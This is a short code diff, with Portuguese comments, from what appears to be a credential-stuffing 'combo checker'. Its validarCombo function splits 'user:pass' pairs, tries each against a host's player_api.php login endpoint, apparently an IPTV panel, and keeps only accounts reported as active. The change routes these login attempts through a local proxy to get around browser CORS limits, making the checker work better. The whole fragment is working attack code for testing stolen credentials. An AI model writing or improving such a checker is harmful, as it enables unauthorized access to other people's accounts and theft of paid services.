@@ -310,10 +310,20 @@ async function validarCombo(host, combo) {
     if (stopRequested) return null;
     const [user, pass] = combo.split(':');
     if (!user || !pass) return null;
-    const urlUserInfo = `http://${host}/player_api.php?username=${user}&password=${pass}`;
+    
+    // Usando nosso proxy para evitar CORS
+    const urlUserInfo = `/api/proxy?host=${encodeURIComponent(host)}&username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+    
     const resUserInfo = await fetchTimeout(urlUserInfo);
     if (!resUserInfo.ok) { errorCount++; return null; }
     const dataUser = await resUserInfo.json();
+    
+    // Verificar se a resposta é um erro do nosso proxy
+    if (dataUser.error) {
+      errorCount++;
+      return null;
+    }
+    
     if (!(dataUser.user_info && dataUser.user_info.status && dataUser.user_info.status.toLowerCase() === 'active')) { errorCount++; return null; }
     const info = dataUser.user_info;
     const mensagem = dataUser.message || "-";
